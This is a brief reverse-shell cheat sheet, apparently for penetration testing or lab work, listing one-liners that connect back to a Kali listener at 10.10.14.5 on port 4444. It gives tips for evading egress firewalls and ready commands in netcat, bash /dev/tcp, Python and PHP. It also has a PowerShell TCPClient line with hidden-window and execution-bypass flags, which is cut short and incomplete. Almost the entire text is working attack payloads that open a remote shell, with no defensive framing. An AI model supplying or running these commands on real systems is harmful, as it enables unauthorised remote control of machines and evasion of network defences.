Useful Port Selection Tips:

  • Use port 443 or 80 if you suspect egress firewall filtering on the target network.
  • Ensure netcat is listening on Kali: nc -lvnp <LPORT> before triggering execution.

Netcat Reverse Shells

nc -e /bin/bash 10.10.14.5 4444

Bash One-Liners

bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

PowerShell Command

powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444)

Python Reverse Shell

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
